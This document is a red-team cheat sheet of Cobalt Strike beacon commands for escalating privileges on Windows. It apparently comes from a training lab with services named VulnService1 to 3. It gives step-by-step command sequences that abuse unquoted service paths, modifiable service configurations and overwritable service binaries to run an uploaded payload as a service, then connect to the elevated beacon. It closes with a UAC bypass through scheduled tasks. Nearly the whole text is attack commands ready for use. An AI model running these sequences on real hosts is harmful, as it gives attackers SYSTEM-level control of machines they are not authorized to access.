# Privilege Escalation

# Query and Manage all the installed services

    beacon> powershell Get-Service | fl
    beacon> run wmic service get name, pathname
    beacon> run sc query
    beacon> run sc qc VulnService2
    beacon> run sc stop VulnService1
    beacon> run sc start VulnService1

# Use SharpUp to find exploitable services

    beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit 

# CASE 1: Unquoted Service Path (Hijack the service binary search logic to execute our payload)

    beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath
    beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl
    beacon> cd C:\Program Files\Vulnerable Services
    beacon> upload C:\Payloads\tcp-local_x64.svc.exe
    beacon> mv tcp-local_x64.svc.exe Service.exe
    beacon> run sc stop VulnService1
    beacon> run sc start VulnService1
    beacon> connect localhost 4444

# CASE 2: Weak Service Permission (Possible to modify service configuration)

    beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices
    beacon> powershell-import C:\Tools\Get-ServiceAcl.ps1
    beacon> powershell Get-ServiceAcl -Name VulnService2 | select -expand Access
    beacon> run sc qc VulnService2
    beacon> mkdir C:\Temp
    beacon> cd C:\Temp
    beacon> upload C:\Payloads\tcp-local_x64.svc.exe
    beacon> run sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe
    beacon> run sc qc VulnService2
    beacon> run sc stop VulnService2
    beacon> run sc start VulnService2
    beacon> connect localhost 4444

# CASE 3: Weak Service Binary Permission (Overwite the service binary due to weak permission)

    beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices
    beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl
    PS C:\Payloads> copy "tcp-local_x64.svc.exe" "Service 3.exe"
    beacon> run sc stop VulnService3
    beacon> cd "C:\Program Files\Vulnerable Services"
    beacon> upload C:\Payloads\Service 3.exe
    beacon> run sc start VulnService3
    beacon> connect localhost 4444

# UAC Bypass

    beacon> run whoami /groups
    beacon> elevate uac-schtasks tcp-local
    beacon> run netstat -anop tcp
    beacon> connect localhost 4444
